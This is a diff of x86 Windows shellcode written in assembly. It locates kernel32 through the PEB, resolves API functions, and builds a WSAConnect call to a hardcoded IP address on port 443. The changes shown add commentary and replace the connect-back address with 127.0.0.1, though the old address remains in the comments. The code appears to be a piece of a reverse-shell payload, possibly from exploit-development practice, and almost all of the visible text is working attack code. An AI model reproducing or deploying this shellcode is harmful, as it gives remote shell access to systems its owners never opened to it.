@@ -1,3 +1,7 @@
+; Shellcode is based on online blog posts.
+; In general, all Windows shellcode, whether x86 or x64, will contain 
+; the below functions until we start calling the Windows API. That is, 
+; all portable shellcode will have the below functions up until load_ws2_32
 %use masm
 
 section .data
@@ -9,33 +13,33 @@ section .text
 
 _start:
     mov   ebp, esp                  ;
-    add   esp, 0xfffff9f0           ; Avoid NULL bytes for sub esp, 0x200.
+    add   esp, 0xfffff9f0           ; NULL bytes
 
-find_kernel32:
+find_kernel32:                      ; Find the PEB 
     xor   ecx, ecx                  ; ECX = 0
     mov   esi,fs:[ecx+30h]          ; ESI = &(PEB) ([FS:0x30])
     mov   esi,[esi+0Ch]             ; ESI = PEB->Ldr
     mov   esi,[esi+1Ch]             ; ESI = PEB->Ldr.InInitOrder
 
-next_module:
+next_module:                        ; Iterate in PEB until we find kernel32
     mov   ebx, [esi+8h]             ; EBX = InInitOrder[X].base_address
     mov   edi, [esi+20h]            ; EDI = InInitOrder[X].module_name
     mov   esi, [esi]                ; ESI = InInitOrder[X].flink (next)
     cmp   [edi+12*2], cx            ; (unicode) modulename[12] == 0x00?
     jne   next_module               ; No: try next module.
    
-find_function_shorten:
+find_function_shorten:              ; Find juicy function locations
     jmp find_function_shorten_bnc   ; Short jump
 
-find_function_ret:
+find_function_ret:                  ; We found the function, let's go back and call it.
     pop esi                         ; POP the return address from the stack
     mov   [ebp+0x04], esi           ; Save find_function address for later usage
     jmp resolve_symbols_kernel32    ;
 
-find_function_shorten_bnc:
+find_function_shorten_bnc:          ; NULL bytes
     call find_function_ret          ; Relative CALL with negative offset
 
-find_function:
+find_function: 
     pushad                          ; Save all registers
     mov   eax, [ebx+0x3c]           ; Offset to PE Signature
     mov   edi, [ebx+eax+0x78]       ; Export Table Directory RVA
@@ -143,7 +147,8 @@ call_wsaconnect:
     xor   eax, eax                  ; Null EAX
     push  eax                       ; Push sin_zero[]
     push  eax                       ; Push sin_zero[]
-    push  0xba2da8c0                ; Push sin_addr (192.168.45.243)
+    push  0x0100007f                ; Push sin_addr (192.168.45.243)
+    ;push  0x0701a8c0                ; Push sin_addr (192.168.45.243)
     mov   ax, 0xbb01                ; Move the sin_port (443)
     shl   eax, 0x10                 ; Left shift EAX by 0x10 bytes
     add   ax, 0x02                  ; Add 0x02 (AF_INET) to AX
